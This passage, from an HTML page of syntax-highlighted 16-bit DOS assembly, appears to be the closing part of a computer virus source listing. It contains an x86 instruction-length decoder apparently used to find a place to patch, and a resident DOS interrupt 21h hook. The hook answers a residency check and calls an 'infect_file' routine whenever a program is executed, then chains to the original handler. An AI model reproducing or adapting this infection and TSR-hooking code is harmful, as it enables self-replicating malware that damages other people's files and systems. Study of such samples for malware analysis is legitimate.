</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">                         </span><span class="sc1">; zero? jump ret</span><span class="sc0">
</span><span class="sc5">fid5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                      </span><span class="sc1">; pushA/popA</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">fid6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ret_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid6</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                      </span><span class="sc1">; size? maybe</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc5">fid7</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc0">                      </span><span class="sc1">; imul reg16/reg16 xxx???</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid8</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid9</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Bh</span><span class="sc0">                      </span><span class="sc1">; imul reg16,reg16/mem,xx???</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fid10</span><span class="sc0">                       </span><span class="sc1">; if not equal Jump fid10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid10</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                      </span><span class="sc1">; jxx?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">                         </span><span class="sc1">; if belowJump</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid11</span><span class="sc0">                       </span><span class="sc1">; if not zero Jump</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid11</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fid12</span><span class="sc0">                       </span><span class="sc1">; if not equal jump 12</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid12</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">fid13</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid13</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid14</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid14</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid15</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid15</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid16</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid17</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid17</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid18</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid18</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid19</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid19</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ret_</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid20</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid20</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid21</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C2h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid22</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">loc_ret_31</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid22</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">loc_ret_31</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid23</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid23</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CEh</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">loc_ret_31</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid24</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid24</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">loc_ret_31</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D4h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid26</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid26</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">loc_ret_31</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid27</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid27</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid28</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid28</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">loc_ret_31</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid29</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cbw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid29</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid30</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid30</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid32</span><span class="sc0">
</span><span class="sc5">fid31</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fid</span><span class="sc0">
</span><span class="sc5">fid32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid33</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid33</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F4h</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">fid31</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid34</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid34</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fid38</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">fid36</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fid35</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid35</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid36</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid37</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid37</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid38</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">end_ret</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">end_ret</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_4</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">45FEh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">parame</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">parame2</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ret3_</span><span class="sc0">                </span><span class="sc1">; if equal jump ret3_</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">ret3_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ret4_</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">ret4_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sub_4</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">loc_ret_52</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">loc_ret_52</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sub_4</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">loc_ret_53</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">loc_ret_53</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; push flags</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1888h</span><span class="sc0">            </span><span class="sc1">; check for TSR</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fun4b</span><span class="sc0">               </span><span class="sc1">; not equal? jump to fun4b</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">                    </span><span class="sc1">; pop flags</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4D49h</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">; interrupt return</span><span class="sc0">
</span><span class="sc5">fun4b</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exiti21</span><span class="sc0">             </span><span class="sc1">; not equal? jump to exiti21</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">exiti21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">                    </span><span class="sc1">; pop flags</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">midinf</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">mid</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
